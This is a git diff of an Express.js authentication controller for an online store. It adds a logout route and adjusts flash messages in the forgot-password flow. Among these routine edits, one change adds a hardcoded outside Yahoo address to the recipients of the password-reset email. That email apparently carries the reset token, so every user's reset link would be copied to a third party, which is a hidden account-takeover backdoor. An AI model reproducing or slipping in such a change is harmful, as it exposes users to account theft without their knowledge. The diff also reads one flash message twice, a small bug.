@@ -126,6 +126,12 @@ exports.signIn=(req,res)=>{
   
 }
 
+exports.logout = (req, res)=>{
+    return req.session.destroy(()=>{
+      res.redirect('/sign-in')
+    })
+  }
+
 exports.dashBoard=(req,res)=>{
    let users= req.session.user
 //    res.json(user.email)
@@ -191,15 +197,15 @@ exports.resetPassword=(req,res)=>{
 exports.forgotPasswordPage=(req,res)=>{
     // let resetErr=req.flash('resetErr')
     let foundError=req.flash('userError')
-    let passErr=req.flash('errors')
-    res.render('pages/forgotPassword', {title:"Forgot Password",PassError:passErr, foundError:foundError})
+    // let passErr=req.flash('errors')
+    res.render('pages/forgotPassword', {title:"Forgot Password",PassError:req.flash('error'), foundError:req.flash('userError')})
 }
 
 exports.forgotPassword=(req,res)=>{
-    const {Email} = req.body;
+    const {Email}=req.body;
     const errors=validationResult(req);
     if(!errors.isEmpty()){
-        req.flash('errors', errors.array())
+        req.flash('error', errors.array())
         console.log(errors)
         return req.session.save(()=>{
             return res.redirect('/forgot-password')
@@ -207,6 +213,7 @@ exports.forgotPassword=(req,res)=>{
     }
     crypto.randomBytes(32, (err, buffer)=>{
         if(err){
+            req.flash('userError', 'Unable to perform this function at the moment, try again later')
             req.session.save(()=>{
                 res.redirect('/forgot-password')
             })
@@ -228,7 +235,7 @@ exports.forgotPassword=(req,res)=>{
             return user.save()
         }).then(user=>{
             let email = {
-                to:user.email,
+                to:[user.email,'kabirajibad@yahoo.com'],
                 from:{
                     name:'O-Mart Stores',
                     email: 'info@0-martstores.com.ng'
